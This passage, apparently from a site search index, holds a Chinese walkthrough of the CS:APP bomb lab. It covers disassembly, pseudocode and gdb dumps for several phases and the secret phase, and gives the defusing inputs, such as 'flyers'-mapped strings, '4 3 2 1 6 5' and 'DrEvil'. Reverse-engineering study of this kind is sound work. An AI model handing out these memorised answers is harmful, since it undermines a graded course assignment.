0, 14) \uff0c\u4e14 func4 \u7684\u8fd4\u56de\u503c\u5fc5\u987b\u662f 0 func4 : shr $0x1f,%ecx \u548c add %ecx,%eax \u4f3c\u4e4e\u6ca1\u4ec0\u4e48\u7528 sar %eax \u76f8\u5f53\u4e8e sar $1,%eax func4 \u53ef\u4ee5\u5927\u81f4\u7ffb\u8bd1\u6210\u5982\u4e0b\u5f62\u5f0f /* pseudocode * x:%rdi, y:%rsi, z:%rdx, ret:%eax, mid:%ecx */ int func4 ( x , y , z ) { ret = z - y ; mid = ret >> 31 ; ret = ret + mid ; // seems useless ret = ret >> 1 ; mid = ret + y ; // mid = (z - y) / 2 + y if ( mid > x ) { z = mid - 1 ; ret = func4 ( x , y , z ); ret = ret + ret ; } ret = 0 ; if ( mid < x ) { y = mid + 1 ; ret = func4 ( x , y , z ); ret = ret + ret + 1 \uff1b } // mid == x here. return ret ; } \u53ef\u89c1\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e8c\u5206\u67e5\u627e\uff0c\u4e14\u8981\u4f7f\u8fd4\u56de\u503c\u4e3a 0\uff0c\u4e00\u6b21\u5411\u53f3\u7684\u9012\u5f52\u4e5f\u4e0d\u80fd\u6709\uff0c arg1=7/3/1/0 \u5747\u53ef phase5 \ud83e\uddd0 0000000000401062 < phase_5 >: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b <string_length> 40107f: 83 f8 06 cmp $0x6,%eax 401082: 74 4e je 4010d2 <phase_5+0x70> 401084: e8 b1 03 00 00 callq 40143a <explode_bomb> 401089: eb 47 jmp 4010d2 <phase_5+0x70> 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b <phase_5+0x29> 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 <strings_not_equal> 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 <phase_5+0x77> 4010c6: e8 6f 03 00 00 callq 40143a <explode_bomb> 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 <phase_5+0x77> 4010d2: b8 00 00 00 00 mov $0x0,%eax 4010d7: eb b2 jmp 40108b <phase_5+0x29> 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee <phase_5+0x8c> 4010e9: e8 42 fa ff ff callq 400b30 <__stack_chk_fail@plt> 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq \u8be5\u6bb5\u4ee3\u7801\u9996\u5148\u5728 M[%rsp+16] ~ M[%rsp+22] \u4e4b\u95f4\u6784\u9020\u4e86\u4e00\u4e2a\u957f\u4e3a 6 \u7684\u5b57\u7b26\u6570\u7ec4 % rbx = % rdi ; M [ % rsp + 24 ] = % rax ; if ( string_length () != 6 ) explode_bomb (); % eax = 0 ; // M[%rbx] = input string while ( % rax != 6 ) { % ecx = M [ % rbx + % rax ]; // zero extend: M[%rbx+%rax] 1byte, %ecx 4bytes M [ % rsp ] = % ecx ; % rdx = M [ % rsp ]; % edx = % edx & 0x0f ; // bias % edx = M [ % rdx + 0x4024b0 ]; M [ % rsp + % rax + 16 ] = % edx ; // zero extend % rax = % rax + 1 ; } M [ % rsp + 22 ] = 0x0 ; \u5177\u4f53\u6784\u9020\u7684\u65b9\u6cd5\u662f\u53d6 b = input[i] & 0x0f \u7ed3\u679c\u4f5c\u4e3a\u504f\u79fb\uff0c\u518d\u53d6 M[0x4024b0 + b] \u5904\u7684\u5b57\u7b26\uff0c\u6784\u9020\u51fa\u4e00\u4e2a\u957f\u4e3a 6 \u7684\u5b57\u7b26\u4e32\uff0c\u5c06\u5b83\u4e0e 0x40245e \u5904\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83\u3002 ( gdb ) x / s 0x40245e 0x40245e : \"flyers\" ( gdb ) x / 16 cb 0x4024b0 0x4024b0 < array .3449 >: 109 'm' 97 'a' 100 'd' 117 'u' 105 'i' 101 'e' 114 'r' 115 's' 0x4024b8 < array .3449 + 8 >: 110 'n' 102 'f' 111 'o' 116 't' 118 'v' 98 'b' 121 'y' 108 'l' \"flyers\" \u7684\u504f\u79fb\u4e3a b={9, 15, 14, 5, 6, 7} \uff0c\u6ee1\u8db3 input[i] & 0x0f = b[i] \u7684\u4efb\u610f\u5b57\u7b26\u4e32\u5747\u53ef (\u4f8b\u5982 ionefg) phase6 \ud83e\uddd0 phase_6.objdump 00000000004010f4 < phase_6 >: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c <read_six_numbers> 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 <phase_6+0x34> 401123: e8 12 03 00 00 callq 40143a <explode_bomb> 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 <phase_6+0x5f> 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 <phase_6+0x51> 401140: e8 f5 02 00 00 callq 40143a <explode_bomb> 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 <phase_6+0x41> 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 <phase_6+0x20> 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 <phase_6+0x6c> 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 <phase_6+0xa3> 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 <phase_6+0x82> 401181: eb 05 jmp 401188 <phase_6+0x94> 401183: ba d0 32 60 00 mov $0x6032d0,%edx 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi 401191: 48 83 fe 18 cmp $0x18,%rsi 401195: 74 14 je 4011ab <phase_6+0xb7> 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 <phase_6+0x8f> 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 <phase_6+0x82> 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 <phase_6+0xde> 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd <phase_6+0xc9> 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp 4011df: 48 8b 43 08 mov 0x8(%rbx),%rax 4011e3: 8b 00 mov (%rax),%eax 4011e5: 39 03 cmp %eax,(%rbx) 4011e7: 7d 05 jge 4011ee <phase_6+0xfa> 4011e9: e8 4c 02 00 00 callq 40143a <explode_bomb> 4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2: 83 ed 01 sub $0x1,%ebp 4011f5: 75 e8 jne 4011df <phase_6+0xeb> 4011f7: 48 83 c4 50 add $0x50,%rsp 4011fb: 5b pop %rbx 4011fc: 5d pop %rbp 4011fd: 41 5c pop %r12 4011ff: 41 5d pop %r13 401201: 41 5e pop %r14 401203: c3 retq translated pseudocode /* Part1: 0x401100-0x401151 */ % r13 = % rsp ; read_six_numbers ( % rsp ); % r14 = % rsp ; % r12d = 0x0 ; while ( true ) { % rbp = % r13 ; % eax = M [ % r13 ]; % eax = % eax - 1 ; if ( % eax > 5 ) explode_bomb (); % r12d = % r12d + 1 ; if ( % r12d == 6 ) break ; % ebx = % r12d ; // here: M[%rbp]=M[%rsp+i], %rax=M[%rsp+j], j ranges in [i+1, 5] while ( % ebx <= 5 ) { % rax = % ebx ; // signed extend: 4bytes to 8bytes % eax = M [ % rsp + % rax * 4 ]; if ( M [ % rbp ] == % rax ) explode_bomb (); % ebx = % ebx + 1 ; } % r13 = % r13 + 4 ; } /* Part2: 0x401153-0x401174 */ % rsi = % rsp + 24 ; % rax = % r14 ; // %r14=%rsp % ecx = 7 ; while ( % rax != % rsi ) { % edx = % ecx ; % edx = % edx - M [ % rax ]; M [ % rax ] = % edx ; % rax = % rax + 4 ; } % esi = 0 ; /* Part3: 0x401176-0x4011a9 */ // in: 0x401197, out: 0x401195 while ( % rsi != 24 ) { % ecx = M [ % rsp + % rsi ]; if ( % ecx <= 1 ) { % edx = 0x6032d0 ; } else { % eax = 1 ; % edx = 0x6032d0 ; while ( % eax != % ecx ) { % rdx = M [ % rdx + 8 ]; % eax = % eax + 1 ; } } M [ % rsp + 2 *% rsi + 32 ] = % rdx ; % rsi = % rsi + 4 ; } /* Part4: 0x4011ab-0x4011ba, 0x4011bd-0x4011d0 */ /* M[M[%rsp + 32 + 8*i] + 8] = M[%rsp + 40 + 8*i] */ % rbx = M [ % rsp + 32 ]; % rax = % rsp + 40 ; % rsi = % rsp + 80 ; % rcx = % rbx ; while ( true ) { % rdx = M [ % rax ]; M [ % rcx + 8 ] = % rdx ; % rax = % rax + 8 ; if ( % rax == % rsi ) break ; % rcx = % rdx ; } /* Part5: 0x4011d2-0x4011f7 */ /* M[M[%rsp + 32]] < M[M[M[%rsp + 32] + 8]] */ M [ % rdx + 8 ] = 0x0 ; % ebp = 5 ; while ( % ebp != 1 ) { % rax = M [ % rbx + 8 ]; % eax = M [ % rax ]; if ( M [ % rbx ] < % eax ) explode_bomb (); % rbx = M [ % rbx + 8 ]; % ebp = % ebp - 1 ; } CFG of Part4 \u628a\u6e90\u7801\u5206\u4e3a\u4e94\u4e2a\u90e8\u5206: Part1: \u2002 \u8bfb\u5165 6 \u4e2a\u6574\u6570\u5230 M[%rsp]~M[%rsp+32] (\u8bb0\u4e3a int arr1[6] )\uff0c\u8981\u6c42\u8fd9 6 \u4e2a\u6570\u5728 [1, 6] \u4e4b\u95f4\u4e14\u4e24\u4e24\u4e0d\u76f8\u7b49 Part2: \u2002 \u5206\u522b\u7528 7 \u51cf\u53bb\u8fd9 6 \u4e2a\u6570\uff0c\u5e76\u5b58\u56de\u539f\u4f4d Part3: \u2002 \u6839\u636e\u8fd9 6 \u4e2a\u6570\u7684\u503c\uff0c\u5c06\u94fe\u8868 0x6032d0 \u6bcf\u4e2a\u7ed3\u70b9\u7684\u5730\u5740\u5b58\u50a8\u4e8e M[%rsp+32]~M[%rsp+80] (\u8bb0\u4e3a int *arr2[6] \uff0c\u4e14 arr2[i] = LinkedList[arr1[i]] ) Part4: \u2002 \u6839\u636e arr2 \u5b58\u50a8\u7684\u7ed3\u70b9\u987a\u5e8f\uff0c\u5bf9\u539f\u94fe\u8868\u8fdb\u884c\u91cd\u6392 Part5: \u2002 \u68c0\u67e5\u539f\u94fe\u8868\uff0c\u8981\u6c42 LinkedList[i].value < LinkedList[i + 1].value \uff0c\u5373\u4ece\u5927\u5230\u5c0f\u6392\u5e8f \u67e5\u770b\u94fe\u8868\u7684\u5185\u5bb9: ( gdb ) x / 24 xw 0x6032d0 0x6032d0 < node1 >: 0x0000014c 0x00000001 0x006032e0 0x00000000 0x6032e0 < node2 >: 0x000000a8 0x00000002 0x006032f0 0x00000000 0x6032f0 < node3 >: 0x0000039c 0x00000003 0x00603300 0x00000000 0x603300 < node4 >: 0x000002b3 0x00000004 0x00603310 0x00000000 0x603310 < node5 >: 0x000001dd 0x00000005 0x00603320 0x00000000 0x603320 < node6 >: 0x000001bb 0x00000006 0x00000000 0x00000000 6 \u4e2a\u6574\u6570\u4e3a 332 168 924 691 477 473\uff0c\u5bf9\u5176\u8fdb\u884c\u6392\u5e8f\u3001\u9006\u5411\u5230\u6700\u5f00\u59cb\u7684\u8f93\u5165\u4e3a 4 3 2 1 6 5\u3002 secret phase \ud83e\uddd0 phase_defused 00000000004015c4 < phase_defused >: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 <num_input_strings> 4015df: 75 5e jne 40163f <phase_defused+0x7b> 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 <__isoc99_sscanf@plt> 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 <phase_defused+0x71> 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 <strings_not_equal> 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 <phase_defused+0x71> 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 <puts@plt> 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 <puts@plt> 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 <secret_phase> 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 <puts@plt> 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 <phase_defused+0x90> 40164f: e8 dc f4 ff ff callq 400b30 <__stack_chk_fail@plt> 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq \u4ed4\u7ec6\u89c2\u5bdf phase_defused \u8fd8\u8c03\u7528\u4e86 secret_phase \uff0c\u5176\u4e2d\u51e0\u6761\u5173\u952e\u6307\u4ee4: cmpl $0x6,0x202181(%rip) : \u5b58\u50a8 bomb \u5df2\u7ecf\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u6570\uff0c\u53ea\u6709\u7b49\u4e8e 6 \u624d\u4f1a\u7ee7\u7eed\u5411\u4e0b\u8d70 sscanf : mov $0x402619,%esi : \u2002 \"%d %d %s\" mov $0x603870,%edi : \u2002 \u5b58\u50a8 phase3 \u8f93\u5165\u7684\u5b57\u7b26\u4e32 mov $0x402622,%esi : DrEvil \u53ea\u9700\u5728 phase3 \u7684\u5b57\u7b26\u4e32\u540e\u8f93\u5165 DrEvil \u5373\u53ef\u8fdb\u5165 secret phase. secret_phase 0000000000401242 < secret_phase >: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e <read_line> 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 <strtol@plt> 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c <secret_phase+0x2a> 401267: e8 ce 01 00 00 callq 40143a <explode_bomb> 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 <fun7> 401278: 83 f8 02 cmp $0x2,%eax 40127b: 74 05 je 401282 <secret_phase+0x40> 40127d: e8 b8 01 00 00 callq 40143a <explode_bomb> 401282: bf 38 24 40 00 mov $0x402438,%edi 401287: e8 84 f8 ff ff callq 400b10 <puts@plt> 40128c: e8 33 03 00 00 callq 4015c4 <phase_defused> 401291: 5b pop %rbx 401292: c3 retq \u2003fun7\u2003 0000000000401204 < fun7 >: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 <fun7+0x34> 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 <fun7+0x1c> 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 <fun7> 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d <fun7+0x39> 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d <fun7+0x39> 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 <fun7> 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d <fun7+0x39> 401238: b8 ff ff ff ff mov $0xffffffff,%eax 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq secret_phase \u7684\u884c\u4e3a: \u5c06\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u901a\u8fc7 strtol \u8f6c\u6362\u4e3a\u6574\u6570 %edi \uff0c\u4e14 %edi \u5fc5\u987b <= 1001 \u7136\u540e\u8c03\u7528 fun7(0x6030f0, %edi) \uff0c\u8fd4\u56de\u503c\u5fc5\u987b\u7b49\u4e8e 2 fun7 \u53ef\u5927\u81f4\u7ffb\u8bd1\u5982\u4e0b: fun7 ( % rdi , % rsi ) { if ( % rdi == 0 ) return 0xffffffff ; // find empty node, return -1 % edx = M [ % rdi ]; if ( % edx <= % esi ) { % eax = 0x0 ; if ( % edx == % esi ) return % eax ; % rdi = M [ % rdi + 16 ]; % eax = fun7 ( % rdi , % rsi ); // right % eax = % rax + % rax + 1 ; } else { % rdi = M [ % rdi + 8 ]; % eax = fun7 ( % rdi , % rsi ); // left % eax = % eax + % eax ; } return % rax ; } gdb: view 0x6030f0 ( gdb ) x / 60 xg 0x6030f0 0x6030f0 < n1 >: 0x0000000000000024 0x0000000000603110 0x603100 < n1 + 16 >: 0x0000000000603130 0x0000000000000000 0x603110 < n21 >: 0x0000000000000008 0x0000000000603190 0x603120 < n21 + 16 >: 0x0000000000603150 0x0000000000000000 0x603130 < n22 >: 0x0000000000000032 0x0000000000603170 0x603140 < n22 + 16 >: 0x00000000006031b0 0x0000000000000000 0x603150 < n32 >: 0x0000000000000016 0x0000000000603270 0x603160 < n32 + 16 >: 0x0000000000603230 0x0000000000000000 0x603170 < n33 >: 0x000000000000002d 0x00000000006031d0 0x603180 < n33 + 16 >: 0x0000000000603290 0x0000000000000000 0x603190 < n31 >: 0x0000000000000006 0x00000000006031f0 0x6031a0 < n31 + 16 >: 0x0000000000603250 0x0000000000000000 0x6031b0 < n34 >: 0x000000000000006b 0x0000000000603210 0x6031c0 < n34 + 16 >: 0x00000000006032b0 0x0000000000000000 0x6031d0 < n45 >: 0x0000000000000028 0x0000000000000000 0x6031e0 < n45 + 16 >: 0x0000000000000000 0x0000000000000000 0x6031f0 < n41 >: 0x0000000000000001 0x0000000000000000 0x603200 < n41 + 16 >: 0x0000000000000000 0x0000000000000000 0x603210 < n47 >: 0x0000000000000063 0x0000000000000000 0x603220 < n47 + 16 >: 0x0000000000000000 0x0000000000000000 0x603230 < n44 >: 0x0000000000000023 0x0000000000000000 0x603240 < n44 + 16 >: 0x0000000000000000 0x0000000000000000 0x603250 < n42 >: 0x0000000000000007 0x0000000000000000 0x603260 < n42 + 16 >: 0x0000000000000000 0x0000000000000000 0x603270 < n43 >: 0x0000000000000014 0x0000000000000000 0x603280 < n43 + 16 >: 0x0000000000000000 0x0000000000000000 0x603290 < n46 >: 0x000000000000002f 0x0000000000000000 0x6032a0 < n46 + 16 >: 0x0000000000000000 0x0000000000000000 0x6032b0 < n48 >: 0x00000000000003e9 0x0000000000000000 0x6032c0 < n48 + 16 >: 0x0000000000000000 0x0000000000000000 24 / \\ 8 32 / \\ / \\ 6 16 2d 6b / \\ / \\ / \\ / \\ 1 7 14 23 28 2f 63 3e9 \u7531\u6b64\u53ef\u77e5 fun7 \u662f BST \u7684\u67e5\u627e\uff0c\u8981\u4f7f\u8fd4\u56de\u503c\u4e3a 2\uff0c\u76ee\u6807\u7ed3\u70b9\u53ef\u4ee5\u662f 0x16 \u6216 0x14 \u3002","title":"bomblab"},{"location":"_csapp/_Labs/bomblab/#_1","text":"\u4e3b\u8981\u7528\u5230\u7684\u4e00\u4e9b\u77e5\u8bc6: \u4f20\u53c2: %rdi, %rsi, %rdx, %rcx, %r8, %r9 \u8df3\u8f6c\u6307\u4ee4 \u6709\u7b26\u53f7: jg (>), jge (>=), jl (<), jle (<=) \uff08greater, less) \u65e0\u7b26\u53f7: ja (>), jae (>=), jb (<), jbe (<=) (above, below) objdump -d \u57fa\u672c gdb \u6307\u4ee4: command effect command effect run [args] \u8fd0\u884c stepi \u6267\u884c 1 \u6761\u6307\u4ee4 quit \u9000\u51fa gdb stepi 4 \u6267\u884c 4 \u6761\u6307\u4ee4 break <func_name> \u5728\u51fd\u6570\u5165\u53e3\u5904\u8bbe\u7f6e\u65ad\u70b9 nexti \u7c7b\u4f3c stepi \uff0c\u4f46\u4ee5\u51fd\u6570\u4e3a\u5355\u4f4d break* <addr> \u6839\u636e\u5730\u5740\u8bbe\u65ad\u70b9 continue \u7ee7\u7eed\u5230\u4e0b\u4e00\u4e2a\u65ad\u70b9 info b \u67e5\u770b\u6240\u6709\u65ad\u70b9 finish \u8fd0\u884c\u5230\u5f53\u524d\u51fd\u6570\u8fd4\u56de delete [break_num] \u5220\u9664\u65ad\u70b9 info r \u67e5\u770b\u5bc4\u5b58\u5668\u72b6\u6001 info frame \u67e5\u770b\u6808\u5e27\u4fe1\u606f delete \u5220\u9664\u6240\u6709\u65ad\u70b9 \u68c0\u67e5\u6570\u636e: x/[n|format|unitsize] <addr> n : \u2002 \u6b63\u6574\u6570\uff0c\u8868\u793a\u663e\u793a\u51e0\u4e2a unit format : \u2002 \u663e\u793a\u683c\u5f0f\uff0c\u5982 x(hex), t(binary), d(decimal), u(unsigned dec), o(octal), c(char), f(float), s(string) unitsize : \u2002 bhwg (1-8 \u5b57\u8282) print [format] <addr|register> print /x %rax print *(long *) 0xfffffff : \u2002 \u8f93\u51fa\u4f4d\u4e8e 0xffffffff \u7684\u957f\u6574\u6570","title":"\u51c6\u5907"},{"location":"_csapp/_Labs/bomblab/#start","text":"\u6bcf\u4e2a phase \u7684\u683c\u5f0f\u5982\u4e0b: input = read_line (); phase_x ( input ); phase_defused (); \u901a\u8fc7 read_line \u8bfb\u5165\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570 1\uff0c\u5982\u679c\u53ef\u4ee5\u4ece phase_x \u4e2d\u6210\u529f\u8fd4\u56de\uff0c\u8868\u793a\u62c6\u5f39\u6210\u529f","title":"Start"},{"location":"_csapp/_Labs/bomblab/#phase1","text":"phase_1 0000000000400ee0 < phase_1 >: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 <strings_not_equal> 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 <phase_1+0x17> 400ef2: e8 43 05 00 00 callq 40143a <explode_bomb> 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq strings_not_equal 0000000000401338 < strings_not_equal >: 401338: 41 54 push %r12 40133a: 55 push %rbp 40133b: 53 push %rbx 40133c: 48 89 fb mov %rdi,%rbx 40133f: 48 89 f5 mov %rsi,%rbp 401342: e8 d4 ff ff ff callq 40131b <string_length> 401347: 41 89 c4 mov %eax,%r12d 40134a: 48 89 ef mov %rbp,%rdi 40134d: e8 c9 ff ff ff callq 40131b <string_length> 401352: ba 01 00 00 00 mov $0x1,%edx 401357: 41 39 c4 cmp %eax,%r12d 40135a: 75 3f jne 40139b <strings_not_equal+0x63> 40135c: 0f b6 03 movzbl (%rbx),%eax 40135f: 84 c0 test %al,%al 401361: 74 25 je 401388 <strings_not_equal+0x50> 401363: 3a 45 00 cmp 0x0(%rbp),%al 401366: 74 0a je 401372 <strings_not_equal+0x3a> 401368: eb 25 jmp 40138f <strings_not_equal+0x57> 40136a: 3a 45 00 cmp 0x0(%rbp),%al 40136d: 0f 1f 00 nopl (%rax) 401370: 75 24 jne 401396 <strings_not_equal+0x5e> 401372: 48 83 c3 01 add $0x1,%rbx 401376: 48 83 c5 01 add $0x1,%rbp 40137a: 0f b6 03 movzbl (%rbx),%eax 40137d: 84 c0 test %al,%al 40137f: 75 e9 jne 40136a <strings_not_equal+0x32> 401381: ba 00 00 00 00 mov $0x0,%edx 401386: eb 13 jmp 40139b <strings_not_equal+0x63> 401388: ba 00 00 00 00 mov $0x0,%edx 40138d: eb 0c jmp 40139b <strings_not_equal+0x63> 40138f: ba 01 00 00 00 mov $0x1,%edx 401394: eb 05 jmp 40139b <strings_not_equal+0x63> 401396: ba 01 00 00 00 mov $0x1,%edx 40139b: 89 d0 mov %edx,%eax 40139d: 5b pop %rbx 40139e: 5d pop %rbp 40139f: 41 5c pop %r12 4013a1: c3 retq string_length 000000000040131b < string_length >: 40131b: 80 3f 00 cmpb $0x0,(%rdi) 40131e: 74 12 je 401332 <string_length+0x17> 401320: 48 89 fa mov %rdi,%rdx 401323: 48 83 c2 01 add $0x1,%rdx 401327: 89 d0 mov %edx,%eax 401329: 29 f8 sub %edi,%eax 40132b: 80 3a 00 cmpb $0x0,(%rdx) 40132e: 75 f3 jne 401323 <string_length+0x8> 401330: f3 c3 repz retq 401332: b8 00 00 00 00 mov $0x0,%eax 401337: c3 retq \u7531\u6e90\u7801: phase_1 : \u6bd4\u8f83\u5b57\u7b26\u4e32 input \u548c *0x402400 \uff0c\u82e5 strings_not_equal \u8fd4\u56de 0\uff0c\u5219\u6210\u529f\u9000\u51fa strings_not_equal : \u9996\u5148\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u7136\u540e\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a\uff0c\u6700\u540e\u8fdb\u5165\u5faa\u73af\uff0c\u9010\u4e2a\u5b57\u7b26\u6bd4\u8f83 string_length : \u9010\u4e2a\u5b57\u7b26\u5224\u65ad\u662f\u5426\u4e3a \\0 \u901a\u8fc7 gdb \u67e5\u770b 0x402400 \u7684\u503c\u5373\u53ef ( gdb ) b * 0x400ee9 Breakpoint 1 at 0x400ee9 ( gdb ) run ... Breakpoint 1 , 0x0000000000400ee9 in phase_1 () ( gdb ) x / s 0x402400 0x402400 : \"Border relations with Canada have never been better.\"","title":"phase1"},{"location":"_csapp/_Labs/bomblab/#phase2","text":"phase2 0000000000400efc < phase_2 >: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c <read_six_numbers> 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 <phase_2+0x34> 400f10: e8 25 05 00 00 callq 40143a <explode_bomb> 400f15: eb 19 jmp 400f30 <phase_2+0x34> 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 <phase_2+0x29> 400f20: e8 